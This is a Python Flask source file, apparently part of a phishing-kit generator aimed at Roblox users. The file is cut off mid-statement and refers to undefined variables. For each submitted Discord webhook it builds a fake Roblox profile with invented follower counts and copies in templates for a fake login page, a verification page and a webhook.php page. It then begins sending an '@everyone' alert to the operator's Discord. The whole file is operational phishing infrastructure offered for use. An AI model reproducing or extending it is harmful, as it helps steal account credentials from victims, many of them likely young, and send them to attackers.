from flask import Flask, request, render_template
import os
import random
import json
import requests
from datetime import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    error = None
    success = None
    
    if request.method == 'POST':
        if 'rusername' in request.form and 'fusername' in request.form and 'dwebhook' in request.form:
            rusername = request.form['rusername']
            fusername = request.form['fusername']
            dwebhook = request.form['dwebhook']
            ab = requests.get(f"https://api.newstargeted.com/roblox/users/v2/user.php?username={rusername}").text
            
            if json.loads(ab).get('userId'):
                parse = requests.utils.urlparse(dwebhook)
                if parse.netloc in ['discord.com', 'discordapp.com']:
                    userid = str(random.randint(1, 1000000))
                    os.makedirs(f"users/{userid}/profile/login/Verification", exist_ok=True)
                    os.makedirs(f"users/{userid}/profile/controller", exist_ok=True)
                    
                    with open("phishing_files/profile.php") as f:
                        profile_content = f.read()
                    
                    with open(f"users/{userid}/profile/index.php", 'w') as f:
                        f.write(profile_content)
                    
                    with open(f"users/{userid}/profile/controller/realusername.txt", 'w') as f:
                        f.write(rusername)
                    with open(f"users/{userid}/profile/controller/fakeusername.txt", 'w') as f:
                        f.write(fusername)
                    with open(f"users/{userid}/profile/controller/aboutme.txt", 'w') as f:
                        f.write(request.form['aboutme'])
                    with open(f"users/{userid}/profile/controller/activity.txt", 'w') as f:
                        f.write('game')
                    with open(f"users/{userid}/profile/controller/friends.txt", 'w') as f:
                        f.write('163')
                    with open(f"users/{userid}/profile/controller/followers.txt", 'w') as f:
                        f.write('3871')
                    with open(f"users/{userid}/profile/controller/followings.txt", 'w') as f:
                        f.write('542')
                    with open(f"users/{userid}/profile/controller/joindate.txt", 'w') as f:
                        f.write('6/4/2017')
                    with open(f"users/{userid}/profile/controller/placevisits.txt", 'w') as f:
                        f.write('782')
                    
                    token = f"{name.upper()}-{os.urandom(16).hex().upper()}"
                    
                    with open("phishing_files/controller/dashboard.php") as f:
                        dashboard_content = f.read().replace('QUBRWEBIRWBQYEIYOB', token)
                    with open(f"users/{userid}/profile/controller/dashboard.php", 'w') as f:
                        f.write(dashboard_content)
                    
                    with open("phishing_files/controller/login.php") as f:
                        login_content = f.read().replace('QUBRWEBIRWBQYEIYOB', token)
                    with open(f"users/{userid}/profile/controller/login.php", 'w') as f:
                        f.write(login_content)
                    
                    with open("phishing_files/login/index.php") as f:
                        login_index_content = f.read()
                    with open(f"users/{userid}/profile/login/index.php", 'w') as f:
                        f.write(login_index_content)
                    
                    with open("phishing_files/login/Verification/index.php") as f:
                        verification_content = f.read()
                    with open(f"users/{userid}/profile/login/Verification/index.php", 'w') as f:
                        f.write(verification_content)
                    
                    with open("phishing_files/login/webhook.php") as f:
                        webhook_content = f.read()
                    with open(f"users/{userid}/profile/login/webhook.php", 'w') as f:
                        f.write(webhook_content)
                    
                    with open(f"users/{userid}/profile/login/b_webhook.txt", 'w') as f:
                        f.write(dwebhook)
                    
                    domain = f"https://{request.host}" if request.is_secure else f"http://{request.host}"
                    timestamp = datetime.now().isoformat()
                    url = dwebhook
                    headers = {"Content-Type": "application/json; charset=utf-8"}
                    POST = {
                        "username": f"{name} - Bot",
                        "avatar_url": thumbnail,
                        "content": "@everyone",
